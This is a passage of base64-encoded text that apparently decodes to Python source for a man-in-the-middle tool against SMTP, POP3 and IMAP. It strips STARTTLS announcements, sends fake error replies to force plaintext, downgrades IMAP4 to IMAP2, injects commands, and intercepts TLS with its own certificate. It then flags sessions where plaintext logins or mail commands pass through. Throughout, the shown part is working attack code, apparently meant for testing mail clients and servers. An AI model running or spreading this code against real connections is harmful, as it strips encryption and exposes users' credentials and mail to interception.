lIHdpdGggc2VydmVyLCB1bnRydXN0ZWQuDQogICAgICAgICAgICAgICAgICAgaW4gY2FzZSBjbGllbnQgZG9lcyBub3QgY2hlY2sga2V5cw0KICAgICAgICAgICAgJycnDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX3NlcnZlcl9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgICMga2VlcCB0cmFjayBvZiBzdHJpcHBlZCBzZXJ2ZXIgZWhsby9oZWxvDQogICAgICAgICAgICAgICAgaWYgYW55KGUgaW4gc2Vzc2lvbi5vdXRib3VuZC5zbmRidWYubG93ZXIoKSBmb3IgZSBpbiAoJ2VobG8nLCdoZWxvJykpIGFuZCAiMjUwIiBpbiBkYXRhIGFuZCBub3Qgc2Vzc2lvbi5kYXRhc3RvcmUuZ2V0KCJzZXJ2ZXJfZWhsb19zdHJpcHBlZCIpOiAjb25seSBkbyB0aGlzIG9uY2UNCiAgICAgICAgICAgICAgICAgICAgIyB3YWl0IGZvciBmdWxsIGxpbmUNCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgbm90ICIyNTAgIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSs9c2Vzc2lvbi5vdXRib3VuZC5yZWN2X2Jsb2NrZWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGZlYXR1cmVzID0gW2YgZm9yIGYgaW4gZGF0YS5zdHJpcCgpLnNwbGl0KCcNCicpIGlmIG5vdCAiU1RBUlRUTFMiIGluIGZdDQogICAgICAgICAgICAgICAgICAgIGlmIGZlYXR1cmVzIGFuZCBub3QgZmVhdHVyZXNbLTFdLnN0YXJ0c3dpdGgoIjI1MCAiKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZlYXR1cmVzWy0xXSA9IGZlYXR1cmVzWy0xXS5yZXBsYWNlKCIyNTAtIiwiMjUwICIpICAjIGVuZCBtYXJrZXINCiAgICAgICAgICAgICAgICAgICAgIyBmb3JjZSBzdGFydHRscyBhbm5vdW5jZW1lbnQNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5kYXRhc3RvcmVbJ3NlcnZlcl9laGxvX3N0cmlwcGVkJ109ICcNCicuam9pbihmZWF0dXJlcykrJw0KJyAjIHN0cmlwcGVkDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiBsZW4oZmVhdHVyZXMpPjE6DQogICAgICAgICAgICAgICAgICAgICAgICBmZWF0dXJlcy5pbnNlcnQoLTEsIjI1MC1TVEFSVFRMUyIpDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBmZWF0dXJlcy5hcHBlbmQoIjI1MCBTVEFSVFRMUyIpDQogICAgICAgICAgICAgICAgICAgICAgICBmZWF0dXJlc1swXT1mZWF0dXJlc1swXS5yZXBsYWNlKCIyNTAgIiwiMjUwLSIpDQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSAnDQonLmpvaW4oZmVhdHVyZXMpKycNCicgIyBmb3JjZWQgc3RhcnR0bHMNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5kYXRhc3RvcmVbJ3NlcnZlcl9laGxvJ10gPSBkYXRhDQogICAgICAgDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIlNUQVJUVExTIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICAjIGRvIGluYm91bmQgU1RBUlRUTFMNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNlbmRhbGwoIjIyMCBHbyBhaGVhZA0KIikNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbICAgICAgXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcigiMjIwIEdvIGFoZWFkDQoiKSkpDQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQgPSBWZWN0b3JzLkdFTkVSSUMuSW50ZXJjZXB0LmNyZWF0ZV9zc2xfY29udGV4dCgpDQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQubG9hZF9jZXJ0X2NoYWluKGNlcnRmaWxlPVZlY3RvcnMuX1RMU19DRVJURklMRSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5ZmlsZT1WZWN0b3JzLl9UTFNfS0VZRklMRSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbICAgICAgXVttYW5nbGVkXSB3YWl0aW5nIGZvciBpbmJvdW5kIFNTTCBoYW5kc2hha2UiJShzZXNzaW9uKSkNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNzbF93cmFwX3NvY2tldF93aXRoX2NvbnRleHQoY29udGV4dCwgc2VydmVyX3NpZGU9VHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PiBbICAgICAgXSAgICAgICAgICBTU0wgaGFuZHNoYWtlIGRvbmU6ICVzIiUoc2Vzc2lvbiwgc2Vzc2lvbi5pbmJvdW5kLnNvY2tldF9zc2wuY2lwaGVyKCkpKQ0KICAgICAgICAgICAgICAgICAgICAjIGluYm91bmQgc3NsLCBmYWtlIHNlcnZlciBlaGxvIG9uIGhlbG8vZWhsbw0KICAgICAgICAgICAgICAgICAgICBpbmRhdGEgPSBzZXNzaW9uLmluYm91bmQucmVjdl9ibG9ja2VkKCkNCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGFueShlIGluIGluZGF0YSBmb3IgZSBpbiAoJ2VobG8nLCdoZWxvJykpOg0KICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBQcm90b2NvbFZpb2xhdGlvbkV4Y2VwdGlvbigid2hvb3AhPyBjbGllbnQgZGlkIG5vdCBzZW5kIEVITE8vSEVMTyBhZnRlciBTVEFSVFRMUyBmaW5pc2hlZC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIoaW5kYXRhKSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA9PiBbICAgICAgXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcihpbmRhdGEpKSkNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNlbmRhbGwoc2Vzc2lvbi5kYXRhc3RvcmVbInNlcnZlcl9laGxvX3N0cmlwcGVkIl0pDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gWyAgICAgIF1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoc2Vzc2lvbi5kYXRhc3RvcmVbInNlcnZlcl9laGxvX3N0cmlwcGVkIl0pKSkNCiAgICAgICAgICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiBhbnkoZSBpbiBkYXRhIGZvciBlIGluICgnZWhsbycsJ2hlbG8nKSkgYW5kIHNlc3Npb24uZGF0YXN0b3JlLmdldCgic2VydmVyX2VobG9fc3RyaXBwZWQiKToNCiAgICAgICAgICAgICAgICAgICAgIyBqdXN0IGRvIG5vdCBmb3J3YXJkIHRoZSBzZWNvbmQgZWhsby9oZWxvDQogICAgICAgICAgICAgICAgICAgIGRhdGE9Tm9uZQ0KICAgICAgICAgICAgICAgIGVsaWYgIm1haWwgZnJvbSIgaW4gZGF0YS5sb3dlcigpOg0KICAgICAgICAgICAgICAgICAgICByZXdyaXRlLnNldF9yZXN1bHQoc2Vzc2lvbiwgVHJ1ZSkNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KIA0KICAgICAgICBjbGFzcyBQcm90b2NvbERvd25ncmFkZVN0cmlwRXh0ZW5kZWRNb2RlOg0KICAgICAgICAgICAgJycnIFJldHVybiBlcnJvciBvbiBFSExPIHRvIGZvcmNlIHBlZXIgdG8gbm9uLWV4dGVuZGVkIG1vZGUNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBkYXRhLmxvd2VyKCkuc3RhcnRzd2l0aCgiZWhsbyAiKToNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNlbmRhbGwoIjUwMiBFcnJvcjogY29tbWFuZCAiRUhMTyIgbm90IGltcGxlbWVudGVkDQoiKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw9IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKCI1MDIgRXJyb3I6IGNvbW1hbmQgIkVITE8iIG5vdCBpbXBsZW1lbnRlZA0KIikpKQ0KICAgICAgICAgICAgICAgICAgICBkYXRhPU5vbmUNCiAgICAgICAgICAgICAgICBlbGlmICJtYWlsIGZyb20iIGluIGRhdGEubG93ZXIoKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIA0KICAgICAgICBjbGFzcyBJbmplY3RDb21tYW5kOg0KICAgICAgICAgICAgJycnIDEpIEFwcGVuZCBjb21tYW5kIHRvIFNUQVJUVExTDQouDQogICAgICAgICAgICAgICAgMikgdW50cnVzdGVkIGludGVyY2VwdCB0byBjaGVjayBpZiB3ZSBnZXQgYW4gaW52YWxpZCBjb21tYW5kIHJlc3BvbnNlIGZyb20gc2VydmVyDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIlNUQVJUVExTIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICBkYXRhICs9ICJJTkpFQ1RFRF9JTlZBTElEX0NPTU1BTkQNCiINCiAgICAgICAgICAgICAgICAgICAgI2xvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPT4gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoZGF0YSkpKQ0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3JzLlNNVFAuVW50cnVzdGVkSW50ZXJjZXB0Lm1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgc3NsLlNTTEVPRkVycm9yLCBzZToNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ2dpbmcuaW5mbygiJXMgLSBTZXJ2ZXIgZmFpbGVkIHRvIG5lZ290aWF0ZSBTU0wgd2l0aCBFeGNlcHRpb246ICVzIiUoc2Vzc2lvbiwgcmVwcihzZSkpKSANCiAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb24uY2xvc2UoKQ0KICAgICAgICAgICAgICAgIGVsaWYgIm1haWwgZnJvbSIgaW4gZGF0YS5sb3dlcigpOg0KICAgICAgICAgICAgICAgICAgICByZXdyaXRlLnNldF9yZXN1bHQoc2Vzc2lvbiwgVHJ1ZSkNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgIA0KICAgIGNsYXNzIFBPUDM6DQogICAgICAgIF9QUk9UT19JRCA9IDExMA0KDQogICAgICAgIGNsYXNzIFN0cmlwRnJvbUNhcGFiaWxpdGllczoNCiAgICAgICAgICAgICcnJyAxKSBGb3JjZSBTZXJ2ZXIgcmVzcG9uc2UgdG8gKk5PVCogYW5ub3VuY2UgU1RMUyBzdXBwb3J0DQogICAgICAgICAgICAgICAgMikgcmFpc2UgZXhjZXB0aW9uIGlmIGNsaWVudCB0cmllcyB0byBuZWdvdGlhdGVkIFNUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBkYXRhLmxvd2VyKCkuc3RhcnRzd2l0aCgnK29rIGNhcGFiaWxpdHknKToNCiAgICAgICAgICAgICAgICAgICAgZmVhdHVyZXMgPSBbZiBmb3IgZiBpbiBkYXRhLnN0cmlwKCkuc3BsaXQoJw0KJykgaWYgbm90ICJzdGxzIiBpbiBmLmxvd2VyKCldDQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSAnDQonLmpvaW4oZmVhdHVyZXMpKycNCicNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBkYXRhLmxvd2VyKCkuc3RhcnRzd2l0aCgic3RscyIpOg0KICAgICAgICAgICAgICAgICAgICByYWlzZSBQcm90b2NvbFZpb2xhdGlvbkV4Y2VwdGlvbigid2hvb3AhPyBjbGllbnQgc2VudCBTVExTIGV2ZW4gdGhvdWdoIHdlIGRpZCBub3QgYW5ub3VuY2UgaXQuLiBwcm90byB2aW9sYXRpb246ICVzIiVyZXByKGRhdGEpKQ0KICAgICAgICAgICAgICAgIGVsaWYgYW55KGMgaW4gZGF0YS5sb3dlcigpIGZvciBjIGluICgnbGlzdCcsJ3VzZXIgJywncGFzcyAnKSk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQoNCiAgICAgICAgY2xhc3MgU3RyaXBXaXRoRXJyb3I6DQogICAgICAgICAgICAnJycgMSkgZm9yY2Ugc2VydmVyIGVycm9yIG9uIGNsaWVudCBzZW5kaW5nIFNUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiAic3RscyIgPT0gZGF0YS5zdHJpcCgpLmxvd2VyKCk6DQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zZW5kYWxsKCItRVJSIHVua25vd24gY29tbWFuZA0KIikNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcigiLUVSUiB1bmtub3duIGNvbW1hbmQNCiIpKSkNCiAgICAgICAgICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiBhbnkoYyBpbiBkYXRhLmxvd2VyKCkgZm9yIGMgaW4gKCdsaXN0JywndXNlciAnLCdwYXNzICcpKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICANCiAgICAgICAgY2xhc3MgVW50cnVzdGVkSW50ZXJjZXB0Og0KICAgICAgICAgICAgJycnIDEpIERvIG5vdCBtYW5nbGUgc2VydmVyIGRhdGENCiAgICAgICAgICAgICAgICAyKSBpbnRlcmNlcHQgY2xpZW50IFNUQVJUTFMsIG5lZ290aWF0ZWQgc3NsX2NvbnRleHQgd2l0aCBjbGllbnQgYW5kIG9uZSB3aXRoIHNlcnZlciwgdW50cnVzdGVkLg0KICAgICAgICAgICAgICAgICAgIGluIGNhc2UgY2xpZW50IGRvZXMgbm90IGNoZWNrIGtleXMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiAic3RscyI9PWRhdGEuc3RyaXAoKS5sb3dlcigpOg0KICAgICAgICAgICAgICAgICAgICAjIGRvIGluYm91bmQgU1RBUlRUTFMNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNlbmRhbGwoIitPSyBCZWdpbiBUTFMgbmVnb3RpYXRpb24NCiIpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gWyAgICAgIF1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoIitPSyBCZWdpbiBUTFMgbmVnb3RpYXRpb24NCiIpKSkNCiAgICAgICAgICAgICAgICAgICAgY29udGV4dCA9IFZlY3RvcnMuR0VORVJJQy5JbnRlcmNlcHQuY3JlYXRlX3NzbF9jb250ZXh0KCkNCiAgICAgICAgICAgICAgICAgICAgY29udGV4dC5sb2FkX2NlcnRfY2hhaW4oY2VydGZpbGU9VmVjdG9ycy5fVExTX0NFUlRGSUxFLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5ZmlsZT1WZWN0b3JzLl9UTFNfQ0VSVEZJTEUpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gWyAgICAgIF1bbWFuZ2xlZF0gd2FpdGluZyBmb3IgaW5ib3VuZCBTU0wgaGFuZHNoYWtlIiUoc2Vzc2lvbikpDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zc2xfd3JhcF9zb2NrZXRfd2l0aF9jb250ZXh0KGNvbnRleHQsIHNlcnZlcl9zaWRlPVRydWUpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD4gWyAgICAgIF0gICAgICAgICAgU1NMIGhhbmRzaGFrZSBkb25lOiAlcyIlKHNlc3Npb24sIHNlc3Npb24uaW5ib3VuZC5zb2NrZXRfc3NsLmNpcGhlcigpKSkNCiAgICAgICAgICAgICAgICAgICAgIyBvdXRib3VuZCBzc2wNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc2VuZGFsbChkYXRhKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdID0+IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKGRhdGEpKSkNCiAgICAgICAgICAgICAgICAgICAgcmVzcF9kYXRhID0gc2Vzc2lvbi5vdXRib3VuZC5yZWN2X2Jsb2NrZWQoKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdIDw9IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKHJlc3BfZGF0YSkpKQ0KICAgICAgICAgICAgICAgICAgICBpZiAiK09LIiBub3QgaW4gcmVzcF9kYXRhOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gY2xpZW50IHNlbnQgU1RBUlRUTFMgZXZlbiB0aG91Z2ggd2UgZGlkIG5vdCBhbm5vdW5jZSBpdC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIocmVzcF9kYXRhKSkNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgWyAgICAgIF0gPT4gW3NlcnZlcl1bbWFuZ2xlZF0gcGVyZm9ybWluZyBvdXRib3VuZCBTU0wgaGFuZHNoYWtlIiUoc2Vzc2lvbikpDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc3NsX3dyYXBfc29ja2V0KCkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA8PiBbc2VydmVyXSAgICAgICAgICBTU0wgaGFuZHNoYWtlIGRvbmU6ICVzIiUoc2Vzc2lvbiwgc2Vzc2lvbi5vdXRib3VuZC5zb2NrZXRfc3NsLmNpcGhlcigpKSkNCiAgICANCiAgICAgICAgICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiBhbnkoYyBpbiBkYXRhLmxvd2VyKCkgZm9yIGMgaW4gKCdsaXN0JywndXNlciAnLCdwYXNzICcpKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIA0KICAgIGNsYXNzIElNQVA6DQogICAgICAgIF9QUk9UT19JRCA9IDE0Mw0KICAgICAgICBjbGFzcyBTdHJpcEZyb21DYXBhYmlsaXRpZXM6DQogICAgICAgICAgICAnJycgMSkgRm9yY2UgU2VydmVyIHJlc3BvbnNlIHRvICpOT1QqIGFubm91bmNlIFNUQVJUVExTIHN1cHBvcnQNCiAgICAgICAgICAgICAgICAyKSByYWlzZSBleGNlcHRpb24gaWYgY2xpZW50IHRyaWVzIHRvIG5lZ290aWF0ZWQgU1RBUlRUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiAiQ0FQQUJJTElUWSAiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgICMgcmZjMjU5NQ0KICAgICAgICAgICAgICAgICAgICBkYXRhID0gZGF0YS5yZXBsYWNlKCIgU1RBUlRUTFMiLCIiKS5yZXBsYWNlKCIgTE9HSU5ESVNBQkxFRCIsIiIpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIiBTVEFSVFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gY2xpZW50IHNlbnQgU1RBUlRUTFMgZXZlbiB0aG91Z2ggd2UgZGlkIG5vdCBhbm5vdW5jZSBpdC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIoZGF0YSkpDQogICAgICAgICAgICAgICAgZWxpZiAiIExPR0lOICIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIA0KICAgICAgICBjbGFzcyBTdHJpcFdpdGhFcnJvcjoNCiAgICAgICAgICAgICcnJyAxKSBmb3JjZSBzZXJ2ZXIgZXJyb3Igb24gY2xpZW50IHNlbmRpbmcgU1RMUw0KICAgICAgICAgICAgJycnDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX3NlcnZlcl9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmIGRhdGEuc3RyaXAoKS5sb3dlcigpLmVuZHN3aXRoKCJzdGFydHRscyIpOg0KICAgICAgICAgICAgICAgICAgICBpZCA9IGRhdGEuc3BsaXQoJyAnLDEpWzBdLnN0cmlwKCkNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNlbmRhbGwoIiVzIEJBRCB1bmtub3duIGNvbW1hbmQNCiIlaWQpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoIiVzIEJBRCB1bmtub3duIGNvbW1hbmQNCiIlaWQpKSkNCiAgICAgICAgICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiAiIExPR0lOICIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCg0KICAgICAgICBjbGFzcyBQcm90b2NvbERvd25ncmFkZVRvVjI6DQogICAgICAgICAgICAnJycgUmV0dXJuIElNQVAyIGluc3RlYWQgb2YgSU1BUDQgaW4gaW5pdGlhbCBzZXJ2ZXIgcmVzcG9uc2UNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBhbGwoa3cubG93ZXIoKSBpbiBkYXRhLmxvd2VyKCkgZm9yIGt3IGluICgiSU1BUDQiLCIqIE9LICIpKToNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNlbmRhbGwoIk9LIElNQVAyIFNlcnZlciBSZWFkeQ0KIikNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcigiT0sgSU1BUDIgU2VydmVyIFJlYWR5DQoiKSkpDQogICAgICAgICAgICAgICAgICAgIGRhdGE9Tm9uZQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICJTVEFSVFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gY2xpZW50IHNlbnQgU1RBUlRUTFMgZXZlbiB0aG91Z2ggd2UgZGlkIG5vdCBhbm5vdW5jZSBpdC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIoZGF0YSkpDQogICAgICAgICAgICAgICAgZWxpZiAibWFpbCBmcm9tIiBpbiBkYXRhLmxvd2VyKCk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQoNCiAgICAgICAgY2xhc3MgVW50cnVzdGVkSW50ZXJjZXB0Og0KICAgICAgICAgICAgJycnIDEpIERvIG5vdCBtYW5nbGUgc2VydmVyIGRhdGENCiAgICAgICAgICAgICAgICAyKSBpbnRlcmNlcHQgY2xpZW50IFNUQVJUTFMsIG5lZ290aWF0ZWQgc3NsX2NvbnRleHQgd2l0aCBjbGllbnQgYW5kIG9uZSB3aXRoIHNlcnZlciwgdW50cnVzdGVkLg0KICAgICAgICAgICAgIC